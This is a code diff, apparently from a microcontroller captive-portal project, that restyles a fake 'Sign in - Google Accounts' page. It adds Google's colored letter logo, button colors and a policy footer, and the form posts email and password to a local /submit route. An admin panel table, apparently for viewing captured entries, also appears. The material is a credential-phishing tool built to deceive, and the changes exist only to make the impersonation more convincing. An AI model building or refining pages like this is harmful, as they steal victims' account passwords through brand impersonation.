@@ -45,38 +45,128 @@ String generateLoginPage(String errorMessage = "") {
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Sign in - Google Accounts</title>
       <style>
+        * {
+          box-sizing: border-box;
+          margin: 0;
+          padding: 0;
+        }
+
         body {
-          font-family: Arial, sans-serif; background: #f5f5f5; margin: 0;
-          display: flex; justify-content: center; align-items: center; height: 100vh;
+          font-family: Arial, sans-serif; /* Use system font that resembles Roboto */
+          background-color: #f5f5f5;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          margin: 0;
         }
+
         .container {
-          background: white; padding: 20px; border-radius: 10px;
-          box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); text-align: center; max-width: 400px;
+          background-color: #ffffff;
+          border-radius: 8px;
+          padding: 40px;
+          width: 100%;
+          max-width: 380px;
+          box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+          text-align: center;
         }
-        .logo svg {
-          width: 75px; margin-bottom: 20px;
+
+        .logo {
+          font-size: 50px;
+          font-weight: 500;
+          margin-bottom: 30px;
         }
+
+        .logo span {
+          color: #4285F4; /* Blue for 'G' */
+        }
+
+        .logo span:nth-child(2) {
+          color: #DB4437; /* Red for the first 'O' */
+        }
+
+        .logo span:nth-child(3) {
+          color: #FBBC05; /* Yellow for the second 'O' */
+        }
+
+        .logo span:nth-child(4) {
+          color: #34A853; /* Green for 'g' */
+        }
+
+        .logo span:nth-child(5) {
+          color: #DB4437; /* Red for 'l' */
+        }
+
+        .logo span:nth-child(6) {
+          color: #4285F4; /* Blue for 'e' */
+        }
+
         input {
-          width: calc(100% - 20px); padding: 10px; margin: 10px 0;
-          border: 1px solid #ccc; border-radius: 4px;
+          width: 100%;
+          padding: 14px;
+          margin: 10px 0;
+          border: 1px solid #dcdcdc;
+          border-radius: 4px;
+          font-size: 16px;
+          color: #333;
+          font-family: Arial, sans-serif; /* Matching system font */
         }
+
+        input[type="email"]:focus, input[type="password"]:focus {
+          border-color: #1a73e8;
+          outline: none;
+        }
+
         button {
-          width: 100%; padding: 10px; background: #1a73e8; color: white; 
-          border: none; border-radius: 4px; font-size: 16px; cursor: pointer;
+          width: 100%;
+          padding: 14px;
+          background-color: #1a73e8;
+          color: white;
+          border: none;
+          border-radius: 4px;
+          font-size: 16px;
+          cursor: pointer;
+          font-family: Arial, sans-serif; /* Matching system font */
+          transition: background-color 0.2s;
         }
-        button:hover { background: #1765c3; }
-        .error { color: red; margin-bottom: 10px; font-size: 14px; }
+
+        button:hover {
+          background-color: #1765c3;
+        }
+
+        .error {
+          color: red;
+          font-size: 14px;
+          margin-bottom: 15px;
+        }
+
+        .footer {
+          font-size: 14px;
+          color: #555;
+          margin-top: 20px;
+        }
+
+        .footer a {
+          color: #1a73e8;
+          text-decoration: none;
+        }
+
+        .footer a:hover {
+          text-decoration: underline;
+        }
+
+        @media (max-width: 600px) {
+          .container {
+            padding: 30px;
+            max-width: 90%;
+          }
+        }
       </style>
     </head>
     <body>
       <div class="container">
         <div class="logo">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
-            <path fill="#EA4335" d="M24 9.5c3.8 0 7.1 1.4 9.7 3.7l7.3-7.3C36.2 2.6 30.4 0 24 0 14.8 0 6.8 5.4 2.8 13.2l8.5 6.6C13.4 14 18.3 9.5 24 9.5z"/>
-            <path fill="#34A853" d="M46.2 24.1c0-1.8-.2-3.5-.5-5.1H24v9.7h12.6c-.5 2.6-2 4.8-4.3 6.3l6.7 5.3c4.3-4 6.8-9.9 6.8-16.2z"/>
-            <path fill="#4A90E2" d="M24 48c6.5 0 11.9-2.1 15.9-5.7l-7.7-6c-2.1 1.4-4.9 2.3-8.2 2.3-6.3 0-11.7-4.2-13.6-9.8l-8.5 6.7C6.6 42.7 14.7 48 24 48z"/>
-            <path fill="#FBBC05" d="M10.4 29.8C9.6 27.7 9.1 25.4 9.1 23s.5-4.7"></path>
-          </svg>
+          <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
         </div>
         <form method="POST" action="/submit">
           <input type="email" name="email" placeholder="Email or phone" required>
@@ -84,6 +174,9 @@ String generateLoginPage(String errorMessage = "") {
           <button type="submit">Sign in</button>
         </form>
         )rawliteral" + (errorMessage != "" ? "<div class='error'>" + errorMessage + "</div>" : "") + R"rawliteral(
+        <div class="footer">
+          <p>By signing in, you agree to our <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.</p>
+        </div>
       </div>
     </body>
     </html>
@@ -128,17 +221,23 @@ String generateAdminPanel() {
       <title>Admin Panel</title>
       <style>
         body {
-          font-family: Arial, sans-serif; background: #f5f5f5; margin: 0;
+          font-family: Arial, sans-serif;
+          background: #f5f5f5;
+          margin: 0;
           padding: 20px;
         }
         table {
-          width: 100%; border-collapse: collapse;
+          width: 100%;
+          border-collapse: collapse;
         }
         th, td {
-          padding: 10px; border: 1px solid #ddd; text-align: left;
+          padding: 10px;
+          border: 1px solid #ddd;
+          text-align: left;
         }
         th {
-          background: #1a73e8; color: white;
+          background: #1a73e8;
+          color: white;
         }
       </style>
     </head>
